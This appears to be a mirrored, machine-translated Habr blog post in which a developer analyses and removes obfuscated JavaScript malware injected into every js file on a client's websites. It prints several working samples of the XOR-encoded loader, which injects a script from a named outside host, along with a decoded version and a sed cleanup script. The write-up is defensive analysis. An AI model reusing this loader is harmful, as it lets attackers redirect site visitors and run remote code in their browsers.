<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Treatment of all js-files on the server or the definition of the encryption method in the day off</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I want to share with Habr's readers a story about how to treat malicious js code on sites located on the same machine. Under the cat is an amateur ana...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Treatment of all js-files on the server or the definition of the encryption method in the day off</h1><div class="post__text post__text-html js-mediator-article">  I want to share with Habr's readers a story about how to treat malicious js code on sites located on the same machine.  Under the cat is an amateur analysis of malicious code, which I conducted solely for the sake of interest, as well as cleaning files on the hosting from malicious code.  This article is not a teaching material, but at the end contains a list of lessons that I learned from this story. <br><a name="habracut"></a><br><h4>  How it all began </h4><br>  On an ordinary working day, my curator set another task: to deal with the confusion that is happening on the websites of one of our clients.  When visiting any of the sites visitor immediately redirected to another page.  A share in this confusion was caused by the fact that the problem on the client‚Äôs and my curator‚Äôs computers was constantly manifested (on Windows), and on my Ubuntu system I could not catch this infection.  Later it turned out that the harmful js-code is a command loader from another machine, which was then executed on the side of the visitor.  As far as I understood, there was a filter on the side of the infected machine that did not give commands when I logged in from my system. <br><br><h4>  Underwater rocks </h4><br><ul><li>  On all sites of our client, absolutely all js files were infected.  At this stage, it became clear that the infection was made using a script that I could not find; </li><li>  In each file, the code structure was different: the function names, variable names, and their succession changed; </li><li>  The time for changing js files was not changed, which made it difficult to find the script with which the action was performed. </li></ul><br><br><div class="spoiler">  <b class="spoiler_title">Examples of evil code:</b> <div class="spoiler_text"><pre><code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEvent(<span class="hljs-string"><span class="hljs-string">'unload'</span></span>, saveSettings);<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tXph13</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">rT</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> zmGud0O(pF7B(rT),<span class="hljs-string"><span class="hljs-string">'w6AOl64ykS2D2vS'</span></span>);}<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> jqhQ8=[<span class="hljs-string"><span class="hljs-string">"004085"</span></span>,<span class="hljs-string"><span class="hljs-string">"005095"</span></span>,<span class="hljs-string"><span class="hljs-string">"007066"</span></span>,<span class="hljs-string"><span class="hljs-string">"020068036046024083113021014062087042070"</span></span>,<span class="hljs-string"><span class="hljs-string">"004068034"</span></span>,<span class="hljs-string"><span class="hljs-string">"003079049042"</span></span>,<span class="hljs-string"><span class="hljs-string">"003083057059067092085015010032081054091006039"</span></span>,<span class="hljs-string"><span class="hljs-string">"022070049042002082119017002063086"</span></span>,<span class="hljs-string"><span class="hljs-string">"031083032043"</span></span>,<span class="hljs-string"><span class="hljs-string">"016083053010000083089028005039065006075034050016120032034009"</span></span>,<span class="hljs-string"><span class="hljs-string">"031066053063086025027010031050070033028005062027004111061025025094010068048092048028028032"</span></span>];<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pF7B</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">m9QAuQ</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u9=<span class="hljs-string"><span class="hljs-string">''</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> uT=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l7n=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(uT=<span class="hljs-number"><span class="hljs-number">0</span></span>;uT&lt;m9QAuQ.length/<span class="hljs-number"><span class="hljs-number">3</span></span>;uT++){u9+=<span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(m9QAuQ.slice(l7n,l7n+<span class="hljs-number"><span class="hljs-number">3</span></span>));l7n=l7n+<span class="hljs-number"><span class="hljs-number">3</span></span>;}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> u9;}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">nZrvPy</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">ci</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> xkw31M=<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">3</span></span>])](tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">0</span></span>])+tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">1</span></span>])+tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">2</span></span>]));xkw31M[tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">4</span></span>])]=ci;xkw31M[tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">5</span></span>])]=tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">6</span></span>]);<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">9</span></span>])](tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">8</span></span>]))[<span class="hljs-number"><span class="hljs-number">0</span></span>][tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">7</span></span>])](xkw31M);}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">zmGud0O</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">fPMlQ,kxzO7O</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> sc7B=<span class="hljs-string"><span class="hljs-string">''</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> q9AOFX=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> wT=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(q9AOFX=<span class="hljs-number"><span class="hljs-number">0</span></span>;q9AOFX&lt;fPMlQ.length;q9AOFX++){<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> oH6=fPMlQ.charAt(q9AOFX);<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> cobu=oH6.charCodeAt(<span class="hljs-number"><span class="hljs-number">0</span></span>)^kxzO7O.charCodeAt(wT);oH6=<span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(cobu);sc7B+=oH6;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(wT==kxzO7O.length<span class="hljs-number"><span class="hljs-number">-1</span></span>)wT=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">else</span></span> wT++;}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (sc7B);}nZrvPy(tXph13(jqhQ8[<span class="hljs-number"><span class="hljs-number">10</span></span>])); .createElement(e[i])}})()<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rt9tP</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">q5m1I</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> dXkiogo(ze2woX1(q5m1I),<span class="hljs-string"><span class="hljs-string">'cliPkVhP3k3b3'</span></span>);}<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ow51o=[<span class="hljs-string"><span class="hljs-string">"016015"</span></span>,<span class="hljs-string"><span class="hljs-string">"017005"</span></span>,<span class="hljs-string"><span class="hljs-string">"019024"</span></span>,<span class="hljs-string"><span class="hljs-string">"000030012049031051045060086006086012071"</span></span>,<span class="hljs-string"><span class="hljs-string">"016030010"</span></span>,<span class="hljs-string"><span class="hljs-string">"023021025053"</span></span>,<span class="hljs-string"><span class="hljs-string">"023009017036068060009038082024080016090019024"</span></span>,<span class="hljs-string"><span class="hljs-string">"002028025053005050043056090007087"</span></span>,<span class="hljs-string"><span class="hljs-string">"011009008052"</span></span>,<span class="hljs-string"><span class="hljs-string">"004009029021007051005053093031064032074055013014030010059013"</span></span>,<span class="hljs-string"><span class="hljs-string">"011024029032081121071035071010071007029016001005098069036029127089024028001093023066003035"</span></span>];if9A1C(rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">10</span></span>]));<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if9A1C</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">pa43Q</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> g4=<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">3</span></span>])](rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">0</span></span>])+rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">1</span></span>])+rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">2</span></span>]));g4[rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">4</span></span>])]=pa43Q;g4[rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">5</span></span>])]=rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">6</span></span>]);<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">9</span></span>])](rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">8</span></span>]))[<span class="hljs-number"><span class="hljs-number">0</span></span>][rt9tP(ow51o[<span class="hljs-number"><span class="hljs-number">7</span></span>])](g4);}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dXkiogo</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">cRXt,e80M</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> k0=<span class="hljs-string"><span class="hljs-string">''</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hz00=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> x5VhMO=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(hz00=<span class="hljs-number"><span class="hljs-number">0</span></span>;hz00&lt;cRXt.length;hz00++){<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> g0=cRXt.charAt(hz00);<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> jLf9N7=g0.charCodeAt(<span class="hljs-number"><span class="hljs-number">0</span></span>)^e80M.charCodeAt(x5VhMO);g0=<span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(jLf9N7);k0+=g0;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(x5VhMO==e80M.length<span class="hljs-number"><span class="hljs-number">-1</span></span>)x5VhMO=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">else</span></span> x5VhMO++;}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (k0);}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ze2woX1</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">hJOCB</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> dMa2=<span class="hljs-string"><span class="hljs-string">''</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n7Z=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pLz4=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(n7Z=<span class="hljs-number"><span class="hljs-number">0</span></span>;n7Z&lt;hJOCB.length/<span class="hljs-number"><span class="hljs-number">3</span></span>;n7Z++){dMa2+=<span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(hJOCB.slice(pLz4,pLz4+<span class="hljs-number"><span class="hljs-number">3</span></span>));pLz4=pLz4+<span class="hljs-number"><span class="hljs-number">3</span></span>;}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> dMa2;} ()})})}})(jQuery);<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eH0</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">kzpR2g</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> tZ=<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">3</span></span>])](aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">0</span></span>])+aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">1</span></span>])+aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">2</span></span>]));tZ[aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">4</span></span>])]=kzpR2g;tZ[aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">5</span></span>])]=aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">6</span></span>]);<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">9</span></span>])](aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">8</span></span>]))[<span class="hljs-number"><span class="hljs-number">0</span></span>][aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">7</span></span>])](tZ);}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">vbX9B</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">b5JWR,cZ73</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> d7=<span class="hljs-string"><span class="hljs-string">''</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> kH5Nhm=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> lO=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(kH5Nhm=<span class="hljs-number"><span class="hljs-number">0</span></span>;kH5Nhm&lt;b5JWR.length;kH5Nhm++){<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> m2z=b5JWR.charAt(kH5Nhm);<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> rT7v3=m2z.charCodeAt(<span class="hljs-number"><span class="hljs-number">0</span></span>)^cZ73.charCodeAt(lO);m2z=<span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(rT7v3);d7+=m2z;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(lO==cZ73.length<span class="hljs-number"><span class="hljs-number">-1</span></span>)lO=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">else</span></span> lO++;}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (d7);}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aFeJ</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">dMk</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> vbX9B(tYiR3(dMk),<span class="hljs-string"><span class="hljs-string">'voRoLKl3Kny18K'</span></span>);}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tYiR3</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">dH5L</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> zS1kLW=<span class="hljs-string"><span class="hljs-string">''</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ub=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> oK078=<span class="hljs-number"><span class="hljs-number">0</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(ub=<span class="hljs-number"><span class="hljs-number">0</span></span>;ub&lt;dH5L.length/<span class="hljs-number"><span class="hljs-number">3</span></span>;ub++){zS1kLW+=<span class="hljs-built_in"><span class="hljs-built_in">String</span></span>.fromCharCode(dH5L.slice(oK078,oK078+<span class="hljs-number"><span class="hljs-number">3</span></span>));oK078=oK078+<span class="hljs-number"><span class="hljs-number">3</span></span>;}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> zS1kLW;}<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pXM7JTD=[<span class="hljs-string"><span class="hljs-string">"005012"</span></span>,<span class="hljs-string"><span class="hljs-string">"004006"</span></span>,<span class="hljs-string"><span class="hljs-string">"006027"</span></span>,<span class="hljs-string"><span class="hljs-string">"021029055014056046041095046003028095076"</span></span>,<span class="hljs-string"><span class="hljs-string">"005029049"</span></span>,<span class="hljs-string"><span class="hljs-string">"002022034010"</span></span>,<span class="hljs-string"><span class="hljs-string">"002010042027099033013069042029026067081059002"</span></span>,<span class="hljs-string"><span class="hljs-string">"023031034010034047047091034002029"</span></span>,<span class="hljs-string"><span class="hljs-string">"030010051011"</span></span>,<span class="hljs-string"><span class="hljs-string">"017010038042032046001086037026010115065031023008028014033046"</span></span>,<span class="hljs-string"><span class="hljs-string">"030027038031118100067064063015013084022056027003096065062062067089056065026095076101028028"</span></span>];eH0(aFeJ(pXM7JTD[<span class="hljs-number"><span class="hljs-number">10</span></span>]));</code> </pre> <br></div></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  Small analysis </h4><br>  I wanted to find out what kind of encryption method the malware used, and I proceeded to refactor the code of one of the example (see below).  This analysis was carried out after treatment in order to satisfy their curiosity. <br><br><div class="spoiler">  <b class="spoiler_title">Read evil code</b> <div class="spoiler_text"><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> massiv = [<span class="hljs-string"><span class="hljs-string">"022022"</span></span>, <span class="hljs-string"><span class="hljs-string">"023028"</span></span>, <span class="hljs-string"><span class="hljs-string">"021001"</span></span>, <span class="hljs-string"><span class="hljs-string">"006007039019069038063009006093009094000"</span></span>, <span class="hljs-string"><span class="hljs-string">"022007033"</span></span>, <span class="hljs-string"><span class="hljs-string">"017012050023"</span></span>, <span class="hljs-string"><span class="hljs-string">"017016058006030041027019002067015066029004017"</span></span>, <span class="hljs-string"><span class="hljs-string">"004005050023095039057013010092008"</span></span>, <span class="hljs-string"><span class="hljs-string">"013016035022"</span></span>, <span class="hljs-string"><span class="hljs-string">"002016054055093038023000013068031114013032004018012019092038"</span></span>, <span class="hljs-string"><span class="hljs-string">"013001054002011108085022023081024085090007008025112092067054085015016031015094000090015006"</span></span>]; exec(wrapper(massiv[<span class="hljs-number"><span class="hljs-number">10</span></span>])); <span class="hljs-comment"><span class="hljs-comment">//   function wrapper(str) { return xor(explode(str), 'euBr1Czec0l0tt'); } //      3      function explode(str) { var mQ418 = ''; var z2wqbh = 0; var pa = 0; for (z2wqbh = 0; z2wqbh &lt; str.length / 3; z2wqbh++) { mQ418 += String.fromCharCode(str.slice(pa, pa + 3)); pa = pa + 3; } return mQ418; } //      head  function exec(mh) { var fq59 = document[wrapper(massiv[3])](wrapper(massiv[0]) + wrapper(massiv[1]) + wrapper(massiv[2])); fq59[wrapper(massiv[4])] = mh; fq59[wrapper(massiv[5])] = wrapper(massiv[6]); document[wrapper(massiv[9])](wrapper(massiv[8]))[0][wrapper(massiv[7])](fq59); } //  , str ‚Äî   , key ‚Äî  function xor(str, key) { var wL73 = ''; var c2 = 0; var i8t = 0; for (c2 = 0; c2 &lt; str.length; c2++) { var h6547 = str.charAt(c2); var pTh = h6547.charCodeAt(0) ^ key.charCodeAt(i8t); h6547 = String.fromCharCode(pTh); wL73 += h6547; if (i8t == key.length - 1) i8t = 0; else i8t++; } return (wL73); }</span></span></code> </pre><br></div></div><br><br><h4>  Work logic </h4><br>  The array contains encrypted commands (createElement, getElementsByTagName, appendChild), as well as the address from which to load further commands (http://state.sml2.ru/js/cnt.js). <br><br>  All the logic of the work lies in two functions.  The first is explode, which splits the input string into groups of 3 digits, from each group receives a symbol by code and combines all these symbols.  The result is sent to the function xor, which uses xor-encryption, but I could be wrong, because I know little about encryption methods. <br><br><h4>  Treatment </h4><br>  For the treatment of this infection, it was decided to use the unix-system command line and regular expressions.  As can be seen from the examples of the malware, it could be added to the file both on the next line and immediately after the last byte in the file (see below). <br><br><pre> <code class="javascript hljs">()})})}})(jQuery);<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eH0</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">kzpR2g</span></span></span><span class="hljs-function">)</span></span>{ .createElement(e[i])}})()<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ow51o=[<span class="hljs-string"><span class="hljs-string">"016015"</span></span>,<span class="hljs-string"><span class="hljs-string">"017005"</span></span>,<span class="hljs-string"><span class="hljs-string">"019024"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEvent(<span class="hljs-string"><span class="hljs-string">'unload'</span></span>, saveSettings);<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tXph13</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">rT</span></span></span><span class="hljs-function">)</span></span></code> </pre><br><br>  The command to replace in the file (antivirus.sh): <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#/bin/bash VIRUS='([\(jQuery\)\;|\)\;|\}|\*\/|\/\/]{0,})(var [a-zA-Z0-9]{2,}=\[".*|function [a-zA-Z0-9]{2,}.*)$'; sed -i -r '/.length\/3;/s/'"$VIRUS"'/\1/' "$1";</span></span></code> </pre><br><br>  Here we search for all strings that contain a virus feature (.length / 3;), and replace it with the result from the first group.  If this is not done, the sed command will remove this piece of healthy code. <br><br>  The self-made antivirus was started with the command: <br><br><pre> <code class="bash hljs">find . -<span class="hljs-built_in"><span class="hljs-built_in">type</span></span> f -name <span class="hljs-string"><span class="hljs-string">"*.js"</span></span> -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bash antivirus.sh {} \;</code> </pre><br>  The result was not long in coming, and after a few minutes I was pleased with the result of my work. <br><br>  Findings: <br><ul><li>  For each site, use its own user in the system with their own rights.  Our client has its own server, which was set up in a sad way: the same user was used for each site, which allowed infecting all the sites on the machine; </li><li>  Use certificates.  Perhaps this would not stop the attackers, but using a certificate along with https would not allow you to connect malicious files from simple sites. </li><li>  Permanent backups.  Unfortunately, the machine was also not configured backup.  I believe that this could help prove to the client that the virus was brought before us, it was enough to show the infected copy created before our coming.  Since  the virus executed commands from the connected file, it could exist on the sites for a very long time, until the scamps decided to include it on their part.  However, evidence is needed for proof, and the facts are such that the virus manifested itself after the start of our work. </li></ul><br><br>  In the end, I express my gratitude to everyone who took the time off for an easy reading.  Comments are welcome. </div><p>Source: <a href="https://habr.com/ru/post/305576/">https://habr.com/ru/post/305576/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../305566/index.html">Deploying Django 1.9 on IIS 7+</a></li>
<li><a href="../305568/index.html">The work of the technical support department of the local positioning system</a></li>
<li><a href="../305570/index.html">Tour of the world fintech hubs</a></li>
<li><a href="../305572/index.html">Digest of recent advances in cryptography. First release</a></li>
<li><a href="../305574/index.html">Torrent Monitoring and Auto Jump</a></li>
<li><a href="../305578/index.html">Hello, TensorFlow. Google Machine Learning Library</a></li>
<li><a href="../305580/index.html">Global range of FINTECH accelerators</a></li>
<li><a href="../305582/index.html">9 Russian companies that make interesting content</a></li>
<li><a href="../305584/index.html">UltraVDS has launched a loyalty program for its VDS / VPS servers</a></li>
<li><a href="../305586/index.html">Everything under control: we protect corporate conversations</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
